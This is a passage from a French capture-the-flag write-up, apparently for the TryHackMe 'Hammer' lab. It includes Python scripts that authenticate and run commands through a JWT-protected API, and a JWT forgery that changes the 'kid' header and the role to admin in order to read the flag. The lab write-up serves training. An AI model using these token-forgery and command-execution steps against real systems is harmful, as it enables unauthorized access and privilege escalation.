</span></span><span style="display:flex;"><span>    time.sleep<span style="color:#ff6ac1">(</span>delay<span style="color:#ff6ac1">)</span>
</span></span><span style="display:flex;"><span><span style="color:#78787e">#    s_code=s_code-1</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff5c57">new_pass_datas</span><span style="color:#ff6ac1">={</span><span style="color:#5af78e">&#34;new_password&#34;</span>:f<span style="color:#5af78e">&#34;{NEW_PASS}&#34;</span>,<span style="color:#5af78e">&#34;confirm_password&#34;</span>:f<span style="color:#5af78e">&#34;{NEW_PASS}&#34;</span><span style="color:#ff6ac1">}</span>
</span></span><span style="display:flex;"><span><span style="color:#ff5c57">final_req</span> <span style="color:#ff6ac1">=</span> s.post<span style="color:#ff6ac1">(</span>URL, <span style="color:#ff5c57">data</span><span style="color:#ff6ac1">=</span>new_pass_datas, <span style="color:#ff5c57">headers</span><span style="color:#ff6ac1">=</span>headers<span style="color:#ff6ac1">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print<span style="color:#ff6ac1">(</span>f<span style="color:#5af78e">&#34;[*] Changement de mot de passe pour {NEW_PASS}&#34;</span><span style="color:#ff6ac1">)</span></span></span></code></pre></div><h3 id="commandes-dadministration">Commandes d&rsquo;administration<a class="anchor" href="#commandes-dadministration">#</a></h3>
<p>Apr√®s la connexion, on se retrouve sur une page web nous permettant d&rsquo;ex√©cuter des commandes bash.</p>
<p>On s‚Äôaper√ßoit qu‚Äô√† part la commande ls, il n‚Äôy a pas beaucoup de commandes possible. Nous allons donc essayer de les √©num√©rer. On peut automatiser l‚Äôex√©cution des commandes :</p>
<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#78787e">#!python3 
</span></span></span><span style="display:flex;"><span>import requests, sys, re, <span style="color:#ff5c57">time</span>
</span></span><span style="display:flex;"><span>import urllib.parse
</span></span><span style="display:flex;"><span>import argparse
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff5c57">parser</span> <span style="color:#ff6ac1">=</span> argparse.ArgumentParser<span style="color:#ff6ac1">()</span>
</span></span><span style="display:flex;"><span>parser.add_argument<span style="color:#ff6ac1">(</span><span style="color:#5af78e">&#34;command&#34;</span><span style="color:#ff6ac1">)</span>
</span></span><span style="display:flex;"><span><span style="color:#ff5c57">args</span> <span style="color:#ff6ac1">=</span> parser.parse_args<span style="color:#ff6ac1">()</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff5c57">s</span> <span style="color:#ff6ac1">=</span> requests.Session<span style="color:#ff6ac1">()</span>
</span></span><span style="display:flex;"><span><span style="color:#ff5c57">PASS</span><span style="color:#ff6ac1">=</span><span style="color:#5af78e">&#34;password123&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff5c57">URL</span> <span style="color:#ff6ac1">=</span> <span style="color:#5af78e">&#34;http://hammer.thm:1337/index.php&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff5c57">URL_exec</span><span style="color:#ff6ac1">=</span> <span style="color:#5af78e">&#34;http://hammer.thm:1337//execute_command.php&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff5c57">headers</span> <span style="color:#ff6ac1">=</span> <span style="color:#ff6ac1">{</span> <span style="color:#5af78e">&#34;Content-Type&#34;</span>: <span style="color:#5af78e">&#34;application/x-www-form-urlencoded&#34;</span><span style="color:#ff6ac1">}</span>
</span></span><span style="display:flex;"><span><span style="color:#ff5c57">delay</span><span style="color:#ff6ac1">=</span><span style="color:#ff9f43">0</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>s.get<span style="color:#ff6ac1">(</span>URL<span style="color:#ff6ac1">)</span>
</span></span><span style="display:flex;"><span><span style="color:#ff5c57">co</span> <span style="color:#ff6ac1">=</span> s.post<span style="color:#ff6ac1">(</span>URL, <span style="color:#ff5c57">data</span><span style="color:#ff6ac1">={</span><span style="color:#5af78e">&#34;email&#34;</span>:<span style="color:#5af78e">&#34;tester@hammer.thm&#34;</span>, <span style="color:#5af78e">&#39;password&#39;</span>:PASS<span style="color:#ff6ac1">}</span>, <span style="color:#ff5c57">headers</span><span style="color:#ff6ac1">=</span>headers<span style="color:#ff6ac1">)</span>
</span></span><span style="display:flex;"><span><span style="color:#78787e">#print(co.text)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff5c57">headers</span> <span style="color:#ff6ac1">=</span> <span style="color:#ff6ac1">{</span> <span style="color:#5af78e">&#34;Content-Type&#34;</span>: <span style="color:#5af78e">&#34;application/json&#34;</span><span style="color:#ff6ac1">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff5c57">token</span> <span style="color:#ff6ac1">=</span> re.search<span style="color:#ff6ac1">(</span>r<span style="color:#5af78e">&#34;var jwtToken = &#39;(.*?)&#39;&#34;</span>, co.text<span style="color:#ff6ac1">)</span>.group<span style="color:#ff6ac1">(</span>1<span style="color:#ff6ac1">)</span>
</span></span><span style="display:flex;"><span><span style="color:#ff5c57">cmd</span> <span style="color:#ff6ac1">=</span> urllib.parse.quote_plus<span style="color:#ff6ac1">(</span><span style="color:#5af78e">&#34;ls&#34;</span><span style="color:#ff6ac1">)</span>
</span></span><span style="display:flex;"><span>headers<span style="color:#ff6ac1">[</span><span style="color:#5af78e">&#34;Authorization&#34;</span><span style="color:#ff6ac1">]=</span>f<span style="color:#5af78e">&#34;Bearer {token}&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff5c57">stdout</span> <span style="color:#ff6ac1">=</span> s.post<span style="color:#ff6ac1">(</span>URL_exec, <span style="color:#ff5c57">json</span><span style="color:#ff6ac1">={</span><span style="color:#5af78e">&#34;command&#34;</span>:args.command<span style="color:#ff6ac1">}</span>, <span style="color:#ff5c57">headers</span><span style="color:#ff6ac1">=</span>headers<span style="color:#ff6ac1">)</span>
</span></span><span style="display:flex;"><span>try :
</span></span><span style="display:flex;"><span>	print<span style="color:#ff6ac1">(</span>stdout.json<span style="color:#ff6ac1">()[</span><span style="color:#5af78e">&#34;output&#34;</span><span style="color:#ff6ac1">])</span>
</span></span><span style="display:flex;"><span>except : 
</span></span><span style="display:flex;"><span>	print<span style="color:#ff6ac1">(</span>stdout.json<span style="color:#ff6ac1">()[</span><span style="color:#5af78e">&#34;error&#34;</span><span style="color:#ff6ac1">])</span></span></span></code></pre></div><h3 id="enum√©ration-locale">Enum√©ration locale<a class="anchor" href="#enum%c3%a9ration-locale">#</a></h3>
<p>Cela nous permet d‚Äô√©num√©rer les commandes possibles et on s‚Äôaper√ßoit que seule la commande ls est autoris√©e. La suite du probl√®me sera donc dans les fichiers disponibles dans notre dossier.</p>
<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@ip-10-82-106-93:~# <span style="color:#ff6ac1">for</span> c in <span style="color:#ff6ac1">$(</span>ls /bin<span style="color:#ff6ac1">)</span>; <span style="color:#ff6ac1">do</span>   python3 exec_cmd.py <span style="color:#5af78e">&#34;</span><span style="color:#ff5c57">$c</span><span style="color:#5af78e">&#34;</span> | grep -v <span style="color:#5af78e">&#34;Command not allowed&#34;</span> <span style="color:#ff6ac1">&amp;&amp;</span> <span style="color:#ff5c57">echo</span> <span style="color:#ff5c57">$c</span> ; <span style="color:#ff6ac1">done</span>
</span></span><span style="display:flex;"><span>188ade1.key
</span></span><span style="display:flex;"><span>composer.json
</span></span><span style="display:flex;"><span>config.php
</span></span><span style="display:flex;"><span>dashboard.php
</span></span><span style="display:flex;"><span>execute_command.php
</span></span><span style="display:flex;"><span>hmr_css
</span></span><span style="display:flex;"><span>hmr_images
</span></span><span style="display:flex;"><span>hmr_js
</span></span><span style="display:flex;"><span>hmr_logs
</span></span><span style="display:flex;"><span>index.php
</span></span><span style="display:flex;"><span>logout.php
</span></span><span style="display:flex;"><span>reset_password.php
</span></span><span style="display:flex;"><span>vendor
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>ls</span></span></code></pre></div><p>Il y a un fichier 188ade1.key qui peut potentiellement nous permettre de chiffrer le jwt avec une autre cl√© et donc changer de compte pour √©lever nos privil√®ges.  Cette cl√© est t√©l√©chargeable : <a href="http://hammer.thm:1337/i88ade1.key">http://hammer.thm:1337/i88ade1.key</a>.
On sait que notre application se trouve dans <strong>/var/www/html</strong> comme vu dans les logs que nous avons trouv√© lors de la phase d‚Äô√©num√©ration.</p>
<h1 id="post-exploitation--escalade-de-privil√®ge">Post Exploitation : Escalade de privil√®ge<a class="anchor" href="#post-exploitation--escalade-de-privil%c3%a8ge">#</a></h1>
<h2 id="faille">Faille<a class="anchor" href="#faille">#</a></h2>
<p>En observant le code source de la page, on s‚Äôaper√ßoit que celle-ci appelle une API s√©curis√©e par un token JWT dont le payload et le header sont :</p>
<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#ff6ac1">{</span>
</span></span><span style="display:flex;"><span>  <span style="color:#5af78e">&#34;typ&#34;</span>: <span style="color:#5af78e">&#34;JWT&#34;</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#5af78e">&#34;alg&#34;</span>: <span style="color:#5af78e">&#34;HS256&#34;</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#5af78e">&#34;kid&#34;</span>: <span style="color:#5af78e">&#34;/var/www/mykey.key&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">}</span>.
</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">{</span>
</span></span><span style="display:flex;"><span>  <span style="color:#5af78e">&#34;iss&#34;</span>: <span style="color:#5af78e">&#34;http://hammer.thm&#34;</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#5af78e">&#34;aud&#34;</span>: <span style="color:#5af78e">&#34;http://hammer.thm&#34;</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#5af78e">&#34;iat&#34;</span>: 1764006630,
</span></span><span style="display:flex;"><span>  <span style="color:#5af78e">&#34;exp&#34;</span>: 1764010230,
</span></span><span style="display:flex;"><span>  <span style="color:#5af78e">&#34;data&#34;</span>: <span style="color:#ff6ac1">{</span>
</span></span><span style="display:flex;"><span>    <span style="color:#5af78e">&#34;user_id&#34;</span>: 1,
</span></span><span style="display:flex;"><span>    <span style="color:#5af78e">&#34;email&#34;</span>: <span style="color:#5af78e">&#34;tester@hammer.thm&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#5af78e">&#34;role&#34;</span>: <span style="color:#5af78e">&#34;user&#34;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#ff6ac1">}</span>
</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">}</span></span></span></code></pre></div><p>On modifie les champs kid et role JWT pour avoir les droits admin et on cr√©e une nouvelle signature avec la cl√© t√©l√©charg√©e :</p>
<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#ff6ac1">{</span>
</span></span><span style="display:flex;"><span>  <span style="color:#5af78e">&#34;typ&#34;</span>: <span style="color:#5af78e">&#34;JWT&#34;</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#5af78e">&#34;alg&#34;</span>: <span style="color:#5af78e">&#34;HS256&#34;</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#5af78e">&#34;kid&#34;</span>: <span style="color:#5af78e">&#34;/var/www/html/188ade1.key&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">}</span>.
</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">{</span>
</span></span><span style="display:flex;"><span>  <span style="color:#5af78e">&#34;iss&#34;</span>: <span style="color:#5af78e">&#34;http://hammer.thm&#34;</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#5af78e">&#34;aud&#34;</span>: <span style="color:#5af78e">&#34;http://hammer.thm&#34;</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#5af78e">&#34;iat&#34;</span>: 1764006630,
</span></span><span style="display:flex;"><span>  <span style="color:#5af78e">&#34;exp&#34;</span>: 1764010230,
</span></span><span style="display:flex;"><span>  <span style="color:#5af78e">&#34;data&#34;</span>: <span style="color:#ff6ac1">{</span>
</span></span><span style="display:flex;"><span>    <span style="color:#5af78e">&#34;user_id&#34;</span>: 1,
</span></span><span style="display:flex;"><span>    <span style="color:#5af78e">&#34;email&#34;</span>: <span style="color:#5af78e">&#34;tester@hammer.thm&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#5af78e">&#34;role&#34;</span>: <span style="color:#5af78e">&#34;admin&#34;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#ff6ac1">}</span>
</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">}</span></span></span></code></pre></div><h2 id="exploit">Exploit<a class="anchor" href="#exploit">#</a></h2>
<p>En modifiant le payload JWT dans notre script  et en changeant la cl√© qui est utilis√© pour signer le token, on obtient les droits admin sur l‚ÄôAPI, ce qui nous permet d‚Äôex√©cuter n‚Äôimporte quelle commande et de retrouver le drapeau :</p>
<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@ip-10-80-65-226:~# python3 ./exec_command.py <span style="color:#5af78e">&#34;cat /home/ubuntu/flag.txt&#34;</span>
</span></span><span style="display:flex;"><span>THM<span style="color:#ff6ac1">{</span>XXXXXXXXXXXXXXXX<span style="color:#ff6ac1">}</span></span></span></code></pre></div></article>
 
      

      <footer class="book-footer">
        
  <div class="flex flex-wrap justify-between">

<div>

</div>

<div>

</div>

</div>





  
  
  
  <div class="flex flex-wrap justify-between">
    <span>
    
      <a href="/docs/tryhackme/" class="flex align-center">
        <img src="/icons/backward.svg" class="book-icon" alt="Backward" />
        <span>TryHackMe</span>
      </a>
    
    </span>
    <span>
    
      <a href="/docs/tryhackme/collapsed/mrrobot/" class="flex align-center">
        <span>Mr Robot</span>
        <img src="/icons/forward.svg" class="book-icon" alt="Forward" />
      </a>
    
    </span>
  </div>
  


 
        
  
  <div class="book-comments">

</div>
  
 
        
        
  
 
        
  
  
    <script>(function(){document.querySelectorAll("pre:has(code)").forEach(e=>{e.addEventListener("click",e.focus),e.addEventListener("copy",function(t){if(t.preventDefault(),navigator.clipboard){const t=window.getSelection().toString()||e.textContent;navigator.clipboard.writeText(t)}})})})()</script>
  

      </footer>

      <label for="menu-control" class="hidden book-menu-overlay"></label>
    </div>

    
  
  <aside class="book-toc">
    <div class="book-toc-content">
      
  
<nav id="TableOfContents">
  <ul>
    <li><a href="#-hammer">üî® Hammer</a>
      <ul>
        <li><a href="#reconnaissance">Reconnaissance</a>
          <ul>
            <li><a href="#port-enumeration">Port Enumeration</a></li>
            <li><a href="#directory-enumeration">Directory Enumeration</a></li>
            <li><a href="#logs">Logs</a></li>
          </ul>
        </li>
        <li><a href="#exploitation">Exploitation</a>
          <ul>
            <li><a href="#contournement-des-limitations">Contournement des limitations</a></li>
            <li><a href="#r√©initialisation-du-mot-de-passe">R√©initialisation du mot de passe</a></li>
            <li><a href="#commandes-dadministration">Commandes d&rsquo;administration</a></li>
            <li><a href="#enum√©ration-locale">Enum√©ration locale</a></li>
          </ul>
        </li>
      </ul>
    </li>
    <li><a href="#post-exploitation--escalade-de-privil√®ge">Post Exploitation : Escalade de privil√®ge</a>
      <ul>
        <li><a href="#faille">Faille</a></li>
        <li><a href="#exploit">Exploit</a></li>
      </ul>
    </li>
  </ul>
</nav>



    </div>
  </aside>
  
 
  </main>

  
</body>
</html>




















